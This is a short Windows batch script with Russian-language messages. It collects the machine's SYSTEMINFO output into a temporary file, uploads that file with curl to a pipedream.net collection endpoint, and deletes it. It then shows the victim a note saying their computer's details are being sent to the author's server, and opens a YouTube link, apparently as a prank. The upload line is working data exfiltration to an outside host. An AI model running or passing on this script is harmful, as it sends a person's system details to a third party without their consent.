@echo off

SYSTEMINFO > tmp.txt

curl.exe -F --data=@tmp.txt https://f0dea6f9d3a33c246f89ed0e770012bd.m.pipedream.net

del tmp.txt

echo Не писий, щас соберется инфа про твой комп и прилетит ко мне на сервер, больше ничего не будет > mes.txt
echo.>> mes.txt
echo Закрой файл) >> mes.txt

mes.txt

del /f mes.txt

start https://www.youtube.com/watch?v=7JRbCWDqe1I^&t=41s
